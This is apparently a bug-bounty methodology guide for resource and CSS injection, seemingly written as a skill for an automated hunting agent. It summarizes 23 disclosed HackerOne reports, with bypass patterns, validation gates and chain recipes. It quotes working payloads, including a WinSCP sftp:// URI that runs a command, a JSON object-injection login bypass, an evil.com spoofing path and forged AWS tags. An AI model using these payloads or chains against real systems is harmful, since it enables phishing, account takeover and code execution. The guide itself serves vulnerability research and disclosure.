### CSS / sanitizer bypasses
```
# Exact-string match on "fixed"
position: fixed           -> rewritten to absolute
position: fixed !important -> survives; full-viewport overlay (#3590586)

# Quote-stripping only
" removed but style tokens kept -> arbitrary element dressing (#587727)

# Remote-image blocker via alternate attribute
allow_remote=false + wash_uri() on src attributes
-> unquoted <body background=...> builds background-image:url() (#3590583)

# Allowlisted attribute name, arbitrary value
set style attribute value directly (cssText) with redressing CSS (#587727)
```

### Identifier-confusion bypasses
```
# Name shadows immutable identifier
branch named as 40-hex hash -> git checkout resolves branch (#790634)
undeclared enum "Soletrader" -> downstream API accepts it (#361189)

# Decoy resource with matching selectors
forged AWS tags -> controller adopts attacker SG (#1238017, #1238482)

# Escalate a CSP-blocked XSS into permitted CSS
#315865: script blocked, style tag allowed -> CSS injection stands
```

### Gadget / lifecycle bypasses
```
# Sanitizer denylist incomplete
DOMPurify strips data-url/data-method but not arbitrary data-* (#1409788)

# Timing / navigation quirk
navigate away then Back -> deferred JS hits the injected content (#1533976)

# Validation at wrong stage
sanitize on approval, inject at creation -> stored payload persists (#257207)
admin-only view renders untrusted field -> admin executes it (#1935628)
```

### Fetch / parser bypasses
```
# Remote definition as trusted config
?configUrl=attacker.json -> attacker controls rendered UI (#2297561, #3124103)
template filename + external XML entity -> XXE (#415137)

# Parameter pollution
duplicate form key -> client library loads external resource (#335339)

# Blind confirmation discipline (mirror the SSRF gate)
a callback/render proves the identifier is consumed, not that it is safe;
attribute it to ONE parameter and show the privileged outcome.
```

---

## Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Show the identifier reaching a privileged sink: rendered attacker config, injected CSS on the trusted origin, an arbitrary POST as the victim, an OS handler invocation, a cloud controller adopting a forged resource, or an XXE file read.
   - A marker that is merely *reflected* is not enough for a resource-injection claim — show the downstream privileged action (#1533976 shows the POST, not just the markup; #1238017 shows the SG change, not just the tag).
   - For native-scheme cases, demonstrate the actual OS handler behavior with a safe proof (e.g., a benign handler), not just that a link exists (#1078002).

2. **What does the victim LOSE?**
   - Authenticated state change (admin account creation, #1409788), full-viewport phishing on a trusted origin (#2297561, #3590586), RCE on the desktop client (#1078002), altered cloud network exposure (#1238017), arbitrary file read (#415137), or auth bypass (#1183335).
   - If the outcome is only "the page is restyled" (#587727, #315865, #601192), score it honestly as low/medium — or find the amplifier before claiming High.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the vulnerable parameter/field still present and the endpoint live?
   - For timing-dependent gadgets, does the navigation sequence (e.g., visit → leave → Back in #1533976) reproduce reliably?
   - For cloud-controller cases, can a second person create the matching-tag decoy and observe adoption without special IAM?
   - For sanitizer bypasses, does the exact payload (`fixed !important`, unquoted `background`) reproduce against the patched version check?

### Red flags — do not submit as a standalone finding

- The value is **only reflected** in an error/forbidden page with no privileged downstream action — this is content spoofing at best (#473144).
- A **marker appears in HTML/CSS** but no script gadget, admin view, or OS handler consumes it — score as the CSS/HTML injection it is (#587727, #601192).
- A **CSP blocks scripts** and the payload is CSS-only (#315865) — report honestly unless an amplifier exists.
- A **callback/render fires but attribution is unclear** — retest with one canary per identifier before naming a field.
- Reproduction depends on a **specific timing/token/luck** that cannot be repeated in 10 minutes — make it deterministic first.

---

## Real Impact Examples

### Scenario A: Stored HTML → arbitrary POST as an admin (GitLab #1409788 / #1533976 pattern)
An attacker creates a Jupyter notebook (or sets a Jira issue title) containing HTML with generic `data-*` attributes. DOMPurify strips the known Rails Ujs attributes `data-url` and `data-method` but leaves arbitrary data attributes intact. A generic deferred-initialization function on page load reads `container.dataset` and issues `$.post(this.dismissEndpoint, …)`. The victim — potentially an administrator — merely views the content; on Chrome/Firefox, navigating away and pressing Back accelerates the deferred data call into the gadget. The result is an arbitrary POST in the victim's authenticated context, including "make an admin create a new admin account for the attacker." CVSS 7.7, $8,690 per report. The resource identifier here is the rendered document; the sink is the victim's session.

### Scenario B: Forged cloud resource identifier → privileged controller (AWS LB Controller #1238017 / #1238482 pattern)
An unprivileged attacker who can create security groups in an AWS account tags one with the three identifiers the AWS Load Balancer Controller uses to associate a managed SG (`elbv2.k8s.aws/cluster`, `ingress.k8s.aws/stack`, `ingress.k8s.aws/resource`). When multiple SGs match, the controller attaches the first one, so the attacker's decoy SG is adopted and attached to the ALB — changing which ports are reachable and by whom, without any permission to modify the ALB or the real managed SG. Medium severity, $500 each. The resource identifier (the tags) is the entire attack.

### Scenario C: Malicious URI scheme → OS handler RCE (Nextcloud Desktop #1078002 pattern)
During the Nextcloud Add Account flow, a malicious server's login page is opened in a native WebView. A link on that page uses an arbitrary URI scheme (e.g., a crafted `sftp://` URL with WinSCP `x-proxytelnetcommand` parameters). Clicking it calls `QDesktopServices::openUrl()`, which dispatches to the OS default application; on a Windows machine with WinSCP installed this yields arbitrary command execution. The URL is the resource identifier; the sink is the operating system's scheme handler. Medium CVSS 4.7, $1,000.

### Scenario D: Config-URL → trusted-origin spoofing (Swagger UI #2297561 / #3124103 pattern)
A self-hosted instance exposes Swagger UI. The application reads `?configUrl=` from the query string and loads a remote OpenAPI definition, then renders it inside the application's own authenticated origin. An attacker crafts a URL pointing to an attacker-controlled JSON file that defines misleading hosts, schemes, and UI strings; the victim is persuaded to open it and sees attacker-authored API documentation that appears to come from the trusted host. The resource identifier is the config URL; the sink is the UI renderer operating on a trusted domain. The result is a convincing phishing/spoofing vector (Medium). The same primitive is reported as potential XSS/manipulation when the injected JSON reaches script-capable UI behavior (#3124103).

### Scenario E: Template filename → XXE (CTF #415137 pattern)
A meme generator accepts a `template` parameter that selects a filename used in the generation process. By enumerating included files from the public source, the researcher recovers the application code and finds that a configuration path is parsed with `DOMDocument->loadXML()` with external entities/DTDs enabled. Supplying an attacker-controlled template filename and an XML body with an external entity makes the parser resolve an attacker-chosen resource with the application's privileges. The resource identifier is the template filename/XML entity; the sink is the XML parser; the impact is XXE/file read.

---

## Disclosed Report Citations

The study pack contains **23 real full reports** (source corpus: 31 assigned reports, 9 from TOP lists). All 23 real reports are cited below — none are invented, and the list is NOT padded to 30 because only 23 full reports are available in the pack. (#1481207 is referenced inside #1533976 as a real report but is not itself one of the mined full reports; it is not counted here.)

1. **Nextcloud — Nextcloud Desktop Client RCE via malicious URI schemes** ([H1 #1078002](https://hackerone.com/reports/1078002)) — native URI-scheme → OS handler RCE, Qt `QDesktopServices::openUrl` / WinSCP `sftp://`, 2021/$1,000.
   - Subclass: resource identifier = URI scheme supplied by a malicious login page; sink = OS default application handler.
   - Technique/payload: `sftp://youtube:com;watch=sn96aVA2;x-proxymethod=5;x-proxytelnetcommand=calc.exe@foo.bar/`; hidden in the connection assistant, clicked in the native Add Account WebView.
   - Impact: arbitrary command execution on the desktop client (Windows + WinSCP).

2. **phpBB — CSS injection via BB code tag** ([H1 #587727](https://hackerone.com/reports/587727)) — CSS/style-attribute injection, quote-stripping bypass + `position:fixed` redressing, 2019.
   - Subclass: BBcode tag input converted into a CSS `style` attribute for a `<span>`.
   - Technique/payload: quotes removed, so breakout impossible; arbitrary CSS tokens kept, `position:fixed` places a skull on the page.
   - Impact: arbitrary page redressing / UI-redressing via forum posts.

3. **Nextcloud — Unquoted body background attribute enables CSS injection that bypasses remote image blocking** ([H1 #3590583](https://hackerone.com/reports/3590583)) — CSS injection / filter bypass, unquoted `<body background>` → `background-image:url()` past `wash_uri()`, 2026.
   - Subclass: HTML-sanitizer resource filter bypass in a mail renderer (`rcube_washtml` / `washtml_callback()`).
   - Technique/payload: with `allow_remote=false`, `wash_uri()` checks image attributes but the `background` callback builds inline `background-image: url(VALUE)`.
   - Impact: external resource load / CSS injection despite the remote-image blocker.

4. **Nextcloud — position: fixed !important bypasses CSS sanitizer's fixed-position mitigation** ([H1 #3590586](https://hackerone.com/reports/3590586)) — CSS sanitizer bypass, `strcasecmp('fixed')` exact-match bypass → full-viewport phishing overlay, 2026.
   - Subclass: sanitizer mitigation bypass in `sanitize_css_block()` (`rcube_utils.php`).
   - Technique/payload: `position: fixed` is rewritten to `absolute`, but `position: fixed !important` fails the exact `strcasecmp($value,'fixed')===0` check and survives.
   - Impact: full-viewport "Session Expired" phishing overlay over an HTML email.

5. **Nextcloud — XSS in Desktop Client in call notification popup** ([H1 #1711847](https://hackerone.com/reports/1711847)) — stored HTML injection, `<img src>` in group-conversation name rendered as HTML, 2022.
   - Subclass: untrusted conversation name used as HTML in the desktop client's call popup.
   - Technique/payload: group conversation named `<img src="https://avatars.githubusercontent.com/u/99037623">`; messages also treated as HTML.
   - Impact: arbitrary HTML injected into the Nextcloud Desktop Client.

6. **Nextcloud — XSS in Desktop Client via user status and information** ([H1 #1707977](https://hackerone.com/reports/1707977)) — stored HTML injection, `<img src>` in Full Name / Status Message, 2022.
   - Subclass: user profile fields not neutralized before rendering in the desktop client.
   - Technique/payload: Full Name and Status Message set to `<img src="https://avatars.githubusercontent.com/u/99037623">`.
   - Impact: arbitrary HTML in the main dialog window of the desktop client.

7. **Coinbase — (untitled: product logo CSS injection)** ([H1 #315865](https://hackerone.com/reports/315865)) — CSS injection, `logo_url` into style tag; CSP blocks XSS but not CSS, 2018/$100.
   - Subclass: file-upload / logo URL interpolated into a `style` tag without escaping.
   - Technique/payload: inject malicious characters into `logo_url`; CSP prevents XSS but CSS injection remains.
   - Impact: CSS injection on a product-creation page.

8. **GitLab — Content injection in Jira issue title enabling sending arbitrary POST request as victim** ([H1 #1533976](https://hackerone.com/reports/1533976)) — stored HTML → arbitrary POST, Rails Ujs `data-*` gadget + back-button browser quirk, 2022/$8,690.
   - Subclass: HTML/CSS injection in a Jira issue `title` escalated through a script gadget.
   - Technique/payload: title renders without HTML encoding; navigate away then Back accelerates deferred JS into the injection.
   - Impact: highly dangerous arbitrary POST request as the victim (High, CVSS 7.7).

9. **GitLab — Arbitrary POST request as victim user from HTML injection in Jupyter notebooks** ([H1 #1409788](https://hackerone.com/reports/1409788)) — stored HTML → arbitrary POST, generic `data-*` attributes surviving DOMPurify, 2021/$8,690.
   - Subclass: notebook HTML injection → Rails Ujs `data-*` gadget (`persistent_user_callout.js`, `$.post(this.dismissEndpoint)`).
   - Technique/payload: DOMPurify strips `data-url`/`data-method` but not arbitrary data attributes; a generic deferred init consumes them.
   - Impact: arbitrary POST as victim — "make an admin create a new admin account for the attacker" (High, CVSS 7.7).

10. **GitLab — When you call your branch the same name as a git hash, it could be checked out by dependents** ([H1 #790634](https://hackerone.com/reports/790634)) — identifier/ref confusion, branch name shadows 40-hex commit hash, 2020/$2,000.
    - Subclass: resource identifier (git ref name) confused with an immutable content address.
    - Technique/payload: create a branch named `e91803d442559d6efb63102b10c919e10901b01d`; `git checkout <hash>` resolves the branch; GitHub blocks this, GitLab did not.
    - Impact: hash-based pinning is no longer secure; dependents check out attacker code.

11. **U.S. Dept Of Defense — Resource Injection (Swagger UI config URL)** ([H1 #2297561](https://hackerone.com/reports/2297561)) — config-URL injection, `?configUrl=` loads remote OpenAPI definition → spoofing/phishing, 2023.
    - Subclass: Swagger UI before 4.1.3 loads a remote OpenAPI definition from a crafted URL.
    - Technique/payload: `?configUrl=<attacker>`; display remote definition inside the trusted self-hosted instance.
    - Impact: phishing/spoofing on a trusted domain (Medium).

12. **Stripe — Object injection in `stripe-billing-typographic` via /auth/login** ([H1 #1183335](https://hackerone.com/reports/1183335)) — object injection → SQLi auth bypass, `{"email":{"email":1}}`, 2021.
    - Subclass: object-typed parameter reaching a SQL builder via the `sqlstring` dependency.
    - Technique/payload: `POST /auth/login` with `{"email":{"email":1},"password":"1234"}` logs in without a valid user (MySQL environment).
    - Impact: authentication bypass (Low, CVSS 3.7).

13. **Monero — Zero-amount miner TX + RingCT allows wallet to receive arbitrary amount of monero** ([H1 #501585](https://hackerone.com/reports/501585)) — resource/amount injection, crafted miner transaction trusted by wallet, 2019 (Critical).
    - Subclass: crafted block passing daemon verification makes a miner transaction display an attacker-chosen XMR sum.
    - Technique/payload: zero-amount miner transaction plus RingCT; wallet reports attacker-selected amount.
    - Impact: theft from exchanges that credit based on wallet display (Critical).

14. **Liberapay — Anyone can register organization legal type as "Soletrader"** ([H1 #361189](https://hackerone.com/reports/361189)) — undeclared enum / type injection, downstream MangoPay API accepts `Soletrader`, 2018.
    - Subclass: enum value outside the UI's documented set is accepted by a downstream API.
    - Technique/payload: change `<option value="BUSINESS">` to `<option value="Soletrader">` in inspector; request succeeds without the "Legal Type is wrong" error.
    - Impact: registration with an unintended legal type.

15. **Kubernetes — AWS Load Balancer Controller Managed Security Groups can be replaced by an unprivileged attacker** ([H1 #1238017](https://hackerone.com/reports/1238017)) — tag-based resource injection, forged SG tags adopted by controller, 2021/$500.
    - Subclass: controller selects the first SG matching `elbv2.k8s.aws/cluster`, `ingress.k8s.aws/stack`, `ingress.k8s.aws/resource` tags.
    - Technique/payload: craft a matching SG; controller attaches it to the ALB without modify permission on the managed SG.
    - Impact: attacker controls ALB port exposure (Medium, CVSS 5.5).

16. **U.S. Dept Of Defense — Swagger UI Injection via Config URL** ([H1 #3124103](https://hackerone.com/reports/3124103)) — config-URL injection, external JSON config → XSS/manipulation, 2025.
    - Subclass: `configUrl` injects custom JSON configuration into Swagger UI.
    - Technique/payload: external JSON source loads and alters Swagger UI behavior.
    - Impact: possible XSS / UI manipulation / information exposure (Medium).

17. **Kubernetes — AWS Load Balancer Controller can modify rules of any Security Group the attacker can tag** ([H1 #1238482](https://hackerone.com/reports/1238482)) — tag-based resource injection, broad IAM + first-match tag logic, 2021/$500.
    - Subclass: IAM policy lets the controller modify any SG the attacker can tag.
    - Technique/payload: attacker with a namespace adds annotations/tags; controller modifies rules of the tagged SG.
    - Impact: inbound-rule modification on arbitrary taggable SGs (Medium, CVSS 5.5).

18. **Nextcloud — Content spoofing on surveyserver.nextcloud.com** ([H1 #473144](https://hackerone.com/reports/473144)) — reflected content spoofing, request URI reflected into forbidden page, 2018.
    - Subclass: unvalidated request URI reflected inside the `.htaccess` forbidden page.
    - Technique/payload: `/ .htaccess%20because%20the%20webserver%20has%20been%20moved%20on%20http://evil.com…`.
    - Impact: arbitrary text inserted into the forbidden page (Low).

19. **h1-5411-CTF — (meme generator: template filename + XXE)** ([H1 #415137](https://hackerone.com/reports/415137)) — filename/resource injection → XXE, `DOMDocument->loadXML()` external entities, 2018.
    - Subclass: `template` parameter sets a filename; XML config path parsed with external entities enabled.
    - Technique/payload: enumerate `include()`s to recover source; inject DTD/external entity into `DOMDocument->loadXML()`; serialized session data involved.
    - Impact: XXE / file read via attacker-chosen template resource.

20. **GitLab — HTML injection with soft email confirmations when Administrator manually confirms attacker email** ([H1 #1935628](https://hackerone.com/reports/1935628)) — stored HTML in admin dialog, unconfirmed email rendered in confirmation modal, 2024/$1,060.
    - Subclass: `confirm_user_data` renders `user.unconfirmed_email` without HTML encoding in an admin modal.
    - Technique/payload: register, change email to an HTML payload, wait for admin manual confirmation.
    - Impact: admin subjected to attacker HTML/JS in the confirmation dialog (Low).

21. **Shopify — (Interviewing site HTML/CSS injection via `candidate=`)** ([H1 #601192](https://hackerone.com/reports/601192)) — HTML injection into DOM / CSS, `candidate=` reflected unfiltered, 2019.
    - Subclass: user-name parameter inserted into the DOM without filtering (only `=` blocked).
    - Technique/payload: `?candidate=z%3Cstyle%3E%20*%20{%20background:%20url(https://www.google.com/...logo.png);%20}`.
    - Impact: HTML injection, mostly CSS injection (Low).

22. **Legal Robot — (Roadmap idea input injection)** ([H1 #257207](https://hackerone.com/reports/257207)) — stored injection, sanitization only at approval stage, 2017/$40.
    - Subclass: input sanitized only during approval, not at creation.
    - Technique/payload: submit a new Idea with malicious code into the Roadmap page.
    - Impact: limited-scope code injection (Low).

23. **Slack — HTTP parameter pollution loading external Greenhouse forms** ([H1 #335339](https://hackerone.com/reports/335339)) — parameter pollution, outdated Greenhouse JS loads attacker form, 2018/$250.
    - Subclass: outdated Greenhouse JS dependency vulnerable to HTTP parameter pollution.
    - Technique/payload: polluted parameters cause loading of external Greenhouse forms not owned by Slack.
    - Impact: attacker-controlled forms on Slack's careers page (Medium).

---

## Related Skills & Chains

- **`hunt-ssrf`** — When the injected resource identifier is a URL that the server fetches, this becomes SSRF. Chain primitive: resource-injection config URL → server-side fetch of an internal/metadata endpoint; apply the OOB-Or-It-Didn't-Happen gate before claiming a blind fetch.
- **`hunt-xss` / `hunt-css-injection`** — CSS/style-attribute injection (#587727, #315865, #3590583) is a sibling primitive; the resource-injection angle is the attacker-controlled value reaching the style `url()`. Chain into UI redressing (#3590586) or a script gadget (#1533976).
- **`hunt-cloud-misconfig`** — Forged AWS tags and broad controller IAM (#1238017, #1238482) are cloud-resource attacks; chain into privilege escalation or network-exposure changes.
- **`hunt-rce`** — Native URI-scheme dispatch (#1078002) and XXE via parser (#415137) are the RCE-adjacent endpoints of this class; validate the final OS/parser behavior safely.
- **`hunt-supply-chain` / `hunt-vcs`** — Ref/hash confusion (#790634) and template-filename injection (#415137) mirror dependency-confusion and malicious-ref attacks; chain into checkout-time code execution on a consumer.
- **`security-arsenal`** — Load sanitizer-bypass payload sets (CSS `!important`, unquoted attributes, DOMPurify `data-*` gaps) and parameter-pollution wordlists before testing filters.
- **`triage-validation`** — Apply Gate 0: show the privileged downstream action (POST, adopted SG, OS handler, file read), attribute it to one identifier, and prove a 10-minute reproduction before submission.

### Common chain recipes (from the corpus)

1. **HTML injection → DOM gadget → admin action** (#1409788 → #1533976): stored markup with arbitrary `data-*` survives DOMPurify, a deferred init reads `dataset` and `$.post(...)`, and an admin who views the content performs a state-changing request.
2. **Config URL → remote definition → trusted-origin spoofing** (#2297561 → #3124103): attacker JSON loaded into a Swagger UI on a trusted host; escalate spoofing into XSS when the config reaches script-capable behavior.
3. **Resource tag → controller adoption → network exposure** (#1238017 → #1238482): forged tags make the controller attach an attacker SG, then the same tag control modifies inbound rules of taggable SGs.
4. **URI scheme → OS default handler → RCE** (#1078002): malicious WebView link supplies an `sftp://` scheme with WinSCP command parameters; click invokes `QDesktopServices::openUrl()`.
5. **Template filename → parser entity → XXE** (#415137): attacker-chosen template path plus external entity in a `loadXML()` parser yields file read.

### When to route to another skill

- If the identifier is a URL that the **server fetches**, switch to `hunt-ssrf` for the fetch/OOB half of the chain.
- If the impact is purely a styled page with no privileged sink, route to `hunt-css-injection` and score Low/Medium — do not inflate it.
- If the forged resource yields cloud permissions or cross-account access, continue with `hunt-cloud-misconfig` / cloud-IAM skills.
- If the final sink is OS command execution (native scheme, XXE-to-RCE), validate with `hunt-rce` before submission.
